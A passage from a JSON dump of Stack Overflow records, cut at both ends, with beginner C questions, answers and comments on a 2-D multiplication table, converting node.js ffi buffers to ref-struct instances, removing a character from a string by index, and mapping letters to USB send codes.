"favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1547212670, "creation_date": 1518553973, "last_edit_date": 1518560536, "question_id": 48775151, "link": "https://stackoverflow.com/questions/48775151/trying-to-get-a-user-input-to-make-a-2-d-array-multiplication-table", "title": "Trying to get a user input to make a 2-D array multiplication table", "body": "<pre><code>int main (void)\n{\n    int range, i, j;\n\n    printf(\"Input size of multiplication table: \");\n    scanf(\"%i\", &amp;range);\n\n    int output[range][range];\n\n    for (i = 0; i&lt;=range; ++i)\n    {\n        for (j=0; j&lt;=range; ++j)\n        {\n            output[i][j] = i * j;\n            if(j!=range &amp;&amp; output[i][j] != 0)\n            {\n                printf(\"%3i \", output[i][j]);\n            }\n            else if (j==range)\n            {\n                printf(\"%3i\", output[i][j]);\n            }\n            else if (output[i][j] == 0)\n            {\n                printf(\"%3i \"), i+2;\n            }\n            else\n            {\n                printf(\"%3i\", j + i - range);\n            }\n        }\n        printf(\"\\n\");\n    }    \n    return 0;\n}\n</code></pre>\n\n<p>I am having it output:</p>\n\n<pre><code>0   1   2   3   4   0\n5   1   2   3   4   5\n10   2   4   6   8  10\n15   3   6   9  12  15\n20   4   8  12  16  20\n25   5  10  15  20  25\n</code></pre>\n\n<p>and I need the 0 on the end to be a five and the first column to be 0,1,2,3,4,5 instead of 0,5,10,15,20,25.\nIf anyone could help I would appreciate it.</p>\n"}, {"tags": ["javascript", "c", "ffi"], "comments": [{"owner": {"reputation": 39159, "user_id": 1541563, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/U4EOh.png?s=128&g=1", "display_name": "Patrick Roberts", "link": "https://stackoverflow.com/users/1541563/patrick-roberts"}, "edited": false, "score": 2, "creation_date": 1518823619, "post_id": 48774858, "comment_id": 84677346, "body": "I can&#39;t test this, but let me know if this works: <code>ref.get(myArray, someIndex, DataPointer).deref()</code> or <code>ref.get(ref.get(myArray, someIndex), 0, Data)</code>"}, {"owner": {"reputation": 167, "user_id": 9078927, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b8ef13d2f91f83391a9b1ffd04194730?s=128&d=identicon&r=PG", "display_name": "nigel", "link": "https://stackoverflow.com/users/9078927/nigel"}, "reply_to_user": {"reputation": 39159, "user_id": 1541563, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/U4EOh.png?s=128&g=1", "display_name": "Patrick Roberts", "link": "https://stackoverflow.com/users/1541563/patrick-roberts"}, "edited": false, "score": 0, "creation_date": 1518977059, "post_id": 48774858, "comment_id": 84713138, "body": "<code>ref.get(myArray.buffer,0,DataPointer).deref()</code> works. Thanks. I&#39;ll be happy to accept this as an answer."}], "answers": [{"tags": [], "owner": {"reputation": 39159, "user_id": 1541563, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/U4EOh.png?s=128&g=1", "display_name": "Patrick Roberts", "link": "https://stackoverflow.com/users/1541563/patrick-roberts"}, "is_accepted": true, "score": 2, "last_activity_date": 1518980729, "creation_date": 1518980729, "answer_id": 48855474, "question_id": 48774858, "link": "https://stackoverflow.com/questions/48774858/converting-node-js-buffer-into-a-ref-struct-instance/48855474#48855474", "title": "Converting node.js buffer into a ref-struct instance", "body": "<p>Looking at the documentation for <a href=\"http://tootallnate.github.io/ref/#exports-get\" rel=\"nofollow noreferrer\"><code>ref.get()</code></a>, you could use that:</p>\n\n<pre><code>ref.get(myArray.buffer, index, DataPointer).deref()\n</code></pre>\n\n<p>will return an instance of <code>Data</code> from <code>index</code> of <code>myArray</code>.</p>\n"}], "owner": {"reputation": 167, "user_id": 9078927, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b8ef13d2f91f83391a9b1ffd04194730?s=128&d=identicon&r=PG", "display_name": "nigel", "link": "https://stackoverflow.com/users/9078927/nigel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1055, "favorite_count": 0, "accepted_answer_id": 48855474, "answer_count": 1, "score": 1, "last_activity_date": 1518980729, "creation_date": 1518552747, "last_edit_date": 1518821519, "question_id": 48774858, "link": "https://stackoverflow.com/questions/48774858/converting-node-js-buffer-into-a-ref-struct-instance", "title": "Converting node.js buffer into a ref-struct instance", "body": "<p>I am writing a program in both C and Javascript (on node.js), using <a href=\"https://www.npmjs.com/package/ffi\" rel=\"nofollow noreferrer\">ffi</a>, <a href=\"https://www.npmjs.com/package/ref\" rel=\"nofollow noreferrer\">ref</a>, and a few other ref- packages.</p>\n\n<p>I have the following code, which I compile into a library libfun.so:</p>\n\n<p>fun.c</p>\n\n<pre><code>#include \"fun.h\"\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n\nvoid fill_array(void **data_array, int length)\n{\n    int i;\n    for (i = 0; i &lt; length; i++) {\n        data_array[i] = malloc(sizeof(data));\n        ((data *)data_array[i])-&gt;id = 256;\n        ((data *)data_array[i])-&gt;message = 512;\n    }   \n}\n\nvoid print_array(void **data_array, int length)\n{\n    int i = 0;\n    for (i = 0; i &lt; length; i++) {\n        printf(\"(%d, %d)\\n\", ((data *)data_array[i])-&gt;id, \n               ((data *)data_array[i])-&gt;message);\n    }\n}\n</code></pre>\n\n<p>fun.h</p>\n\n<pre><code>#ifndef fun_h__\n#define fun_h__\n\ntypedef struct {\n    int id;\n    int message;\n} data;\n\nvoid fill_array(void **,int);\nvoid print_array(void **,int);\n\n#endif\n</code></pre>\n\n<p>fun.js</p>\n\n<pre><code>var ffi = require('ffi');\nvar Struct = require('ref-struct');\nvar ref = require('ref');\nvar ArrayType = require('ref-array');\n\n// js analog of the data struct from fun.h\nvar Data = Struct({\n  id: ref.types.int,\n  message: ref.types.int,\n});\n// js analog of the type data *\nvar DataPointer = ref.refType(Data);\n\n// pvoid is the js analog of void * in C\nvar pvoid = ref.refType(ref.types.void);\nvar PVoidArray = ArrayType(pvoid);\n\n// set up our foreign functions from libfun\nvar libfun = ffi.Library('./libfun', {\n    'fill_array' : ['void', [PVoidArray,ref.types.int]],\n    'print_array' : ['void', [PVoidArray, ref.types.int]]\n});\nvar myArray = new PVoidArray(10);\nlibfun.fill_array(myArray,10);\nlibfun.print_array(myArray,10); // this prints the array of structs correctly, from the C side\n</code></pre>\n\n<p>My question is: how can I print the array of structs <strong>from the Javascript side</strong>? <strong>I want to pass myArray in as a <code>PVoidArray</code>.</strong> I do not want to create an array of structs (i.e. create <code>var DataArray = ArrayType(DataPointer)</code>, and use that instead of <code>PVoidArray</code> everywhere). </p>\n\n<p>Let's start with myArray[0]. Can we use our variable <code>Data</code> to (in a flexible way) take <code>myArray[0]</code> and make a struct? Like some function <code>bufferToArray(myArray[0],Data) == a Data instance containing the data of myArray[0]</code>. </p>\n"}, {"tags": ["c", "string"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518552190, "post_id": 48774684, "comment_id": 84550999, "body": "How do you use the function? What arguments do you pass it, what are their values? Can you please try to create a <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable Example</a> to show us? And you <i>have</i> tried <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">to debug your program</a>?"}, {"owner": {"reputation": 354, "user_id": 8811872, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Lzl0A.jpg?s=128&g=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/8811872/kevin"}, "edited": false, "score": 0, "creation_date": 1518552216, "post_id": 48774684, "comment_id": 84551015, "body": "Where are you removing a certain char in your code?"}, {"owner": {"reputation": 3975, "user_id": 8513665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c39368317b0749f5d8f09735796c470e?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Gibbons", "link": "https://stackoverflow.com/users/8513665/christian-gibbons"}, "edited": false, "score": 3, "creation_date": 1518552253, "post_id": 48774684, "comment_id": 84551035, "body": "A char cannot be removed from the middle of a string with O(1) complexity."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 2, "creation_date": 1518552392, "post_id": 48774684, "comment_id": 84551119, "body": "The function is fine.  The problem is how it&#39;s being called.  Are you passing in a pointer to a string constant or an array?  The former will cause a crash."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1518554026, "post_id": 48774684, "comment_id": 84551996, "body": "Oh, right, <code>s[index+1]</code> will get the null terminator on the last iteration."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1518554081, "post_id": 48774684, "comment_id": 84552020, "body": "@dbush is probably right, see <a href=\"https://stackoverflow.com/questions/164194/why-do-i-get-a-segmentation-fault-when-writing-to-a-string-initialized-with-cha\" title=\"why do i get a segmentation fault when writing to a string initialized with cha\">stackoverflow.com/questions/164194/&hellip;</a>"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1518554105, "post_id": 48774684, "comment_id": 84552033, "body": "<a href=\"https://ideone.com/4QDlH0\" rel=\"nofollow noreferrer\">This function works as intended</a>. The problem is in the code you <i>don&#39;t</i> show. That&#39;s why you need to create a <a href=\"http://stackoverflow.com/help/mcve\">Minimal, <b>Complete</b>, and Verifiable Example</a> and show us."}, {"owner": {"reputation": 610, "user_id": 8979940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmzYf.jpg?s=128&g=1", "display_name": "Omer Dagan", "link": "https://stackoverflow.com/users/8979940/omer-dagan"}, "edited": false, "score": 0, "creation_date": 1518554128, "post_id": 48774684, "comment_id": 84552046, "body": "You get a fault simply because <code>0</code> is not the same as <code>\\0</code>. To be clear the end of a string is set to <code>\\0</code> by comparing to 0 you miss the exit condition and get an index out of bounds"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 610, "user_id": 8979940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmzYf.jpg?s=128&g=1", "display_name": "Omer Dagan", "link": "https://stackoverflow.com/users/8979940/omer-dagan"}, "edited": false, "score": 1, "creation_date": 1518554202, "post_id": 48774684, "comment_id": 84552076, "body": "@Dagan No, <code>&#39;\\0&#39; == 0</code>. The escape <code>\\0</code> inserts the octal representation of the integer value zero into the string or character."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518554762, "post_id": 48774684, "comment_id": 84552353, "body": "<a href=\"http://idownvotedbecau.se/nomcve/\" rel=\"nofollow noreferrer\">idownvotedbecau.se/nomcve</a> and <a href=\"http://idownvotedbecau.se/itsnotworking/\" rel=\"nofollow noreferrer\">idownvotedbecau.se/itsnotworking</a> and <a href=\"http://idownvotedbecau.se/nodebugging/\" rel=\"nofollow noreferrer\">idownvotedbecau.se/nodebugging</a>"}, {"owner": {"reputation": 610, "user_id": 8979940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmzYf.jpg?s=128&g=1", "display_name": "Omer Dagan", "link": "https://stackoverflow.com/users/8979940/omer-dagan"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518588843, "post_id": 48774684, "comment_id": 84562878, "body": "@Some programmer dude - you are correct.. Sorry verified when I got home my mistake"}], "answers": [{"comments": [{"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 1, "creation_date": 1518553409, "post_id": 48775005, "comment_id": 84551653, "body": "Using C++ keywords like <code>new</code> in C code can lead to confusion."}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518553521, "post_id": 48775005, "comment_id": 84551714, "body": "@EugeneSh.  To both comments, I will either address, or delete answer in the next few minutes.  Thanks."}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518554200, "post_id": 48775005, "comment_id": 84552075, "body": "@EugeneSh. - edited to add version <i>by index</i>.  Thanks."}], "tags": [], "owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "is_accepted": false, "score": 0, "last_activity_date": 1518555826, "last_edit_date": 1518555826, "creation_date": 1518553299, "answer_id": 48775005, "question_id": 48774684, "link": "https://stackoverflow.com/questions/48774684/removing-a-char-from-a-string-in-c-by-index/48775005#48775005", "title": "removing a char from a string in c by index", "body": "<p>Without seeing how you are calling your function, knowing the exact failure mode is difficult.  Calling it with <code>char string[] = \"this is a string\";</code>, it worked fine.  But as the comments suggest, some other forms of input strings may cause a problem.  </p>\n\n<p>I have used the following implementation with no problems.  It removes all occurrences of a specified character:</p>\n\n<pre><code>int RemoveCharFromString(char *orig, char c, char *newStr)\n{\n    if(!orig) return -1;\n    if(!newStr) return -1;\n    int i=0, j=0;\n\n    while (*(orig+i) != '\\0')\n    {\n        if (*(orig+i) != c)\n        {\n            *(newStr+j) = *(orig+i);\n            j++;\n            i++;\n        }\n        else i++;\n    }\n    *(newStr+j) = '\\0';\n    return 0;\n}\n</code></pre>\n\n<p>Or, as you requested, this one removes a character at a specified index:</p>\n\n<pre><code>int RemoveCharFromStringByIndex(char *orig, int index, char *newStr)\n{\n    if(!orig) return -1;\n    if(!newStr) return -1;\n    int i=0, j=0;\n\n    while (*(orig+i) != '\\0')\n    {\n        if (i != index)\n        {\n            *(newStr+j) = *(orig+i);\n            j++;\n            i++;\n        }\n        else i++;\n    }\n    *(newStr+j) = '\\0';\n    return 0;\n}\n</code></pre>\n\n<p>Notice, in this implementation <code>newStr</code> is created by caller and must include space enough to contain the result.    </p>\n\n<p>You can certainly adapt these in any way you need to.  An improvement would be to change the prototype to:</p>\n\n<pre><code>char * RemoveCharFromString(char *orig, char c);\n</code></pre>\n\n<p>Or</p>\n\n<pre><code>char * RemoveCharFromStringByIndex(char *orig, int index)\n</code></pre>\n\n<p>But that will be something you can do, if you wish it so.</p>\n"}, {"tags": [], "owner": {"reputation": 356, "user_id": 4485708, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hwfmt.png?s=128&g=1", "display_name": "Whilom Chime", "link": "https://stackoverflow.com/users/4485708/whilom-chime"}, "is_accepted": false, "score": 0, "last_activity_date": 1518561900, "creation_date": 1518561900, "answer_id": 48776929, "question_id": 48774684, "link": "https://stackoverflow.com/questions/48774684/removing-a-char-from-a-string-in-c-by-index/48776929#48776929", "title": "removing a char from a string in c by index", "body": "<p>I always like this for removing a specific char from a string:</p>\n\n<pre><code>int RemoveCharFromString(const char *src, char *dst, char c)\n{\n    const char *s;\n    char       *d;\n\n    if ((char *)0 != src &amp;&amp; (char *)0 != dst) {\n\n        for (d = dst, s = src; (*d = *s); s++) {\n\n            if (c != *d)\n                d++;\n        }\n\n        return 0;\n    }\n    return 1;\n}\n</code></pre>\n\n<p>Only increment the destination pointer if it's not equal to the character being skipped.  Sometimes you see this using the passed arguments src and dst directly, but way back when some compilers would produce more efficient code with separate pointers.  The \"const\" simply allows you to pass a constant string as the source without producing a compiler error.</p>\n"}], "owner": {"reputation": 85, "user_id": 7714907, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/90c9a3a2df49e2481a39bc17aa29960c?s=128&d=identicon&r=PG&f=1", "display_name": "saar13531", "link": "https://stackoverflow.com/users/7714907/saar13531"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 431, "favorite_count": 0, "answer_count": 2, "score": -5, "last_activity_date": 1518561900, "creation_date": 1518552011, "last_edit_date": 1518554218, "question_id": 48774684, "link": "https://stackoverflow.com/questions/48774684/removing-a-char-from-a-string-in-c-by-index", "title": "removing a char from a string in c by index", "body": "<p>how can I remove a certain char from a string in c without using any library \nfunctions? the function i wrote seems to have a run time error and i can not figure out why.</p>\n\n<pre><code>void remove_char(char* s,int index)\n{\n    while(s[index+1] != 0)\n       {\n           s[index] = s[index + 1];\n           index++;\n       }\n      s[index] = 0;\n}\n</code></pre>\n\n<p>I was also wondering if there is a way to remove a char in a complexity of 1?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "edited": false, "score": 4, "creation_date": 1518551577, "post_id": 48774550, "comment_id": 84550686, "body": "they are seuqnetial? x04,x05...x026"}, {"owner": {"reputation": 55871, "user_id": 10077, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/be4e820c7af6f3b79cf055d984cda7ff?s=128&d=identicon&r=PG", "display_name": "Fred Larson", "link": "https://stackoverflow.com/users/10077/fred-larson"}, "edited": false, "score": 0, "creation_date": 1518551605, "post_id": 48774550, "comment_id": 84550700, "body": "If all your keys are sequential like that, you could use an array and use <code>c - &#39;a&#39;</code> as the index."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518551612, "post_id": 48774550, "comment_id": 84550708, "body": "I would use an array indexed by the letters (shifted to 0 base of course..)"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 55871, "user_id": 10077, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/be4e820c7af6f3b79cf055d984cda7ff?s=128&d=identicon&r=PG", "display_name": "Fred Larson", "link": "https://stackoverflow.com/users/10077/fred-larson"}, "edited": false, "score": 1, "creation_date": 1518551645, "post_id": 48774550, "comment_id": 84550719, "body": "@FredLarson While <code>c - &#39;a&#39;</code> will work with ASCII encoding, it&#39;s not mandated to work for any characters except digits by the C specification."}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 1, "creation_date": 1518551658, "post_id": 48774550, "comment_id": 84550729, "body": "Why not a 256 entry look-up table? This could be as simple as <code>char[256]</code>."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1518551724, "post_id": 48774550, "comment_id": 84550759, "body": "Do you really want to map to a string? Then sprintf the c-&#39;a&#39;+4. But if you actually want to map to integer values it is directly c-&#39;a&#39;+4."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518552504, "post_id": 48774550, "comment_id": 84551178, "body": "@tadmann The usual problem with <code>some_type lookup[256]</code> is that users tend to use it via <code>lookup[c]</code> rather than the correct <code>lookup[c - CHAR_MIN]</code> or some other scheme to cope with negative <code>char c</code>."}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "edited": false, "score": 0, "creation_date": 1518566662, "post_id": 48774550, "comment_id": 84556941, "body": "C compilers compile giant switch statements into a jump table, if the hardware architecture supports it. This means the giant switch statement is a good option in practice, especially if it is easy to maintain."}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 1, "last_activity_date": 1518551758, "creation_date": 1518551758, "answer_id": 48774623, "question_id": 48774550, "link": "https://stackoverflow.com/questions/48774550/whats-the-preferred-way-in-c-to-map-some-values-to-other-values/48774623#48774623", "title": "What&#39;s the preferred way in c to map some values to other values?", "body": "<p>Assuming your system is using something like ASCII or UTF-8 character encoding, where the Latin letters a-z are sequential, you can create an array of your values:</p>\n\n<pre><code>char *sendcodes[] = { \"0x04\", \"0x05\", \"0x06\", ... };\n</code></pre>\n\n<p>Then you would index it by subtracting <code>'a'</code> from the letter in question, giving you an index from 0 to 25:</p>\n\n<pre><code>return sendcodes[c - 'a'];\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 1, "creation_date": 1518552556, "post_id": 48774700, "comment_id": 84551197, "body": "The first array isn&#39;t really being used here.  Even if it was, you&#39;d need to search it instead of indexing it directly."}], "tags": [], "owner": {"reputation": 546, "user_id": 2556381, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9189a3cc00250a0a0195dc42c10a0e77?s=128&d=identicon&r=PG", "display_name": "Aaron Garton", "link": "https://stackoverflow.com/users/2556381/aaron-garton"}, "is_accepted": false, "score": 0, "last_activity_date": 1518552080, "creation_date": 1518552080, "answer_id": 48774700, "question_id": 48774550, "link": "https://stackoverflow.com/questions/48774550/whats-the-preferred-way-in-c-to-map-some-values-to-other-values/48774700#48774700", "title": "What&#39;s the preferred way in c to map some values to other values?", "body": "<p>You could try using parallel arrays, as long as you have the same amount of data in both of the arrays. Just loop through the first array and use the variable <code>i</code> as an index into the second array:<br /></p>\n\n<pre><code>char array1[]  = {'a', 'b', 'c'};\nchar *array2[] = {\"x04\", \"x05\", \"x06\"};\n\nfor (int i=0; i&lt;sizeof(array1)/sizeof(array1[0]); i++)\n{\n    printf(\"%s\\n\", array2[i]);\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1518553469, "post_id": 48774891, "comment_id": 84551683, "body": "<code>sendcodes[c]</code> may be indexed with a negative <code>c</code>.  Suggest <code>sendcodes[(unsigned char) c];</code>"}], "tags": [], "owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "is_accepted": false, "score": 2, "last_activity_date": 1518552904, "creation_date": 1518552904, "answer_id": 48774891, "question_id": 48774550, "link": "https://stackoverflow.com/questions/48774550/whats-the-preferred-way-in-c-to-map-some-values-to-other-values/48774891#48774891", "title": "What&#39;s the preferred way in c to map some values to other values?", "body": "<p>For my part, I'd create a lookup table:</p>\n\n<pre><code>static char sendcodes[256][5]; // declared outside of any function;\n                               // \"static\" means it's only visible\n                               // within the current source file\n\nvoid init_sendcodes( void )\n{\n  for ( unsigned char c = 'a'; c &lt;= 'z'; c++ )\n    sprintf( sendcodes[c], \"%02hhx\", c - 'a' + 4 );\n}\n\nchar *mapSendcode( char c )\n{\n  return sendcodes[c];\n}\n</code></pre>\n\n<p>Note that this code assumes an encoding where <code>'a'</code> through <code>'z'</code> are contiguous (ASCII or UTF-8). If they're not, well, you'll have to use multiple loops.  </p>\n\n<p>When you're done, <code>sendcode['a']</code> contains the string <code>\"0x04\"</code>, <code>sendcode['b']</code> contains <code>\"0x05\"</code>, etc.  So while it takes some work to initialize the table, you only have to do that once at the beginning of the program - after that it's just an array lookup.  </p>\n"}], "owner": {"reputation": 35, "user_id": 9356810, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-KeGB-oFYUe8/AAAAAAAAAAI/AAAAAAAAACM/bPdXT9cROEc/photo.jpg?sz=128", "display_name": "Noah Evans", "link": "https://stackoverflow.com/users/9356810/noah-evans"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 82, "favorite_count": 0, "answer_count": 3, "score": 2, "last_activity_date": 1520106310, "creation_date": 1518551439, "last_edit_date": 1520106310, "question_id": 48774550, "link": "https://stackoverflow.com/questions/48774550/whats-the-preferred-way-in-c-to-map-some-values-to-other-values", "title": "What&#39;s the preferred way in c to map some values to other values?", "body": "<p>I'm a python programmer who is doing a project in c. I need to map letters to the usb sendcodes corresponding to them. In python I would hardcode in a dictionary. In C I'm using a giant <code>switch</code> statement. Is there a better way?</p>\n\n<pre><code>switch(c){\n    case 'a':\n        return \"x04\";\n        break;\n    case 'b':\n        return \"x05\";\n        break;\n    case 'c':\n        return \"x06\";\n        break;\n</code></pre>\n"}, {"tags": ["c", "debugging"], "comments": [{"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 3, "creation_date": 1518549649, "post_id": 48773931, "comment_id": 84549689, "body": "Since you&#39;re learning C one of the first things to learn is to not abuse global variables like this. Learn about scope and passing things in as needed."}, {"owner": {"reputation": 3737, "user_id": 7417402, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0362a30046be9244cf62d2a9fc6f8568?s=128&d=identicon&r=PG", "display_name": "Devstr", "link": "https://stackoverflow.com/users/7417402/devstr"}, "edited": false, "score": 